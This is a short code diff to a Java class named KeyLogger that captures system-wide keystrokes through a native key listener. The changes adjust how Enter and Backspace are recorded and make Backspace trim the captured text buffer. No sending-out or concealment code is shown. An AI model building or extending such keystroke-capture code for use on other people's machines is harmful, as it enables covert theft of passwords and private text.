@@ -80,7 +80,8 @@ public class KeyLogger implements NativeKeyListener {
     	keyword.put(NativeKeyEvent.VC_SPACE," ");
     	keyword.put(NativeKeyEvent.VC_COMMA, ",");
     	keyword.put(NativeKeyEvent.VC_PERIOD,".");
-    	keyword.put(NativeKeyEvent.VC_ENTER, "|");
+    	keyword.put(NativeKeyEvent.VC_ENTER, "");
+    	keyword.put(NativeKeyEvent.VC_BACKSPACE, "");
     	
     	running = false;
     	
@@ -107,12 +108,13 @@ public class KeyLogger implements NativeKeyListener {
 		System.out.println(e.getKeyCode());
         int code = e.getKeyCode();
         String val =parser(e.getKeyCode()); 
+
         if(!StringUtils.isEmpty(val));
         	data += val;
         	
         
         
-        if(code == NativeKeyEvent.VC_SPACE){
+        if(code == NativeKeyEvent.VC_BACKSPACE){
         	if(data.length()>0)
         		data = data.substring(0, data.length()-1);
         }
